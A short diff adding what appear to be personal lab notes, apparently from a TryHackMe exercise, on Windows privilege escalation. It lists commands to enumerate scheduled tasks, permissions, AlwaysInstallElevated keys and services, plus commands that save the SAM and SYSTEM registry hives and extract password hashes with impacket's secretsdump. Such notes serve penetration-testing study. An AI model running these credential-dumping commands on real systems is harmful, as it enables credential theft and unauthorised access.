@@ -1,1 +1,21 @@
+Windows
+
+Check scheduled tasks
+schtasks /query /tn vulntask /fo list /v
+
+Check perms
+icacls c:\tasks\schtask.bat
+
+AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+Win services
+sc qc <whatever>
+
+Dumping SAM n SYSTEM hashes
+ reg save hklm\system C:\Users\THMBackup\system.hive
+ reg save hklm\sam C:\Users\THMBackup\sam.hive
+python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+
+
 
